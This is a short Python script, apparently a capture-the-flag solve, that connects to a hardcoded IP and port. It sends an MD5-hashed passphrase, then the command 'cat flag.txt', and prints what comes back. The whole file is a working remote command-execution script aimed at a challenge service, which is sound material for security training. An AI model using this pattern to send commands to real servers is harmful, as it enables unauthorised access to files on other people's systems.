import socket
import sys
import select
from hashlib import md5

def main():
    server_address = ('188.166.145.178',30607)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('connecting to %s port %s' % server_address, file=sys.stderr)
    sock.connect(server_address)
    msg = md5(b's4v3_th3_w0rld').hexdigest()
    print("Sending: " + msg)
    socket_send(sock,(msg).encode())
    msg = 'command:cat flag.txt'
    msg_len = len(msg)
    print("Sending: " + str(msg_len))
    socket_send(sock,bytes([msg_len]))
    print("Sending: " + msg)
    socket_send(sock,msg.encode())
    data = socket_receive(sock)
    print(data.decode())


def socket_receive(sock):
    data = b''
    try:
        amount_expected = 4096
        ready = select.select([sock], [], [], 2)
        data = sock.recv(amount_expected)
    finally:
        return data

def socket_send(sock, data):
    try:
        sock.send(data)
    except:
        print("Couldn't send data")


if __name__ == "__main__":
    main()